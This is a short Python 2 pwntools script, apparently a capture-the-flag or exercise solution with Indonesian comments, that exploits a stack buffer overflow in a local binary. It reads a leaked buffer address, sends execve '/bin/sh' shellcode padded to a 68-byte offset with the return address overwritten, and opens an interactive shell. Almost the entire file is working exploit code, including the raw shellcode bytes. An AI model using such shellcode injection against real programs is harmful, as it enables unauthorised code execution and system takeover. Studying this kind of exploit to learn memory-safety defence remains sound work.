# !!! DO'NOT BUILD PYTHON3
#  (python shellcode.py; cat -) | ./a.out
import struct
from pwn import *

context(arch='i386', os='linux')

p = process('./a.out')
p.recvuntil("Buffer ada di: ")

offset = 68
#buff = 0xffffd0f8 # GDB >0xffffd008 SSH>0xffffd3e8
buff = int(p.recvline(), 16)
buff_byte = struct.pack("<I", buff)

print "dapat alamat buffer: ", hex(buff)

shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
sampah = "A" * (offset-len(shellcode))

payload = shellcode + sampah + buff_byte
#print(payload)
p.sendline(payload+"\n")
p.interactive()
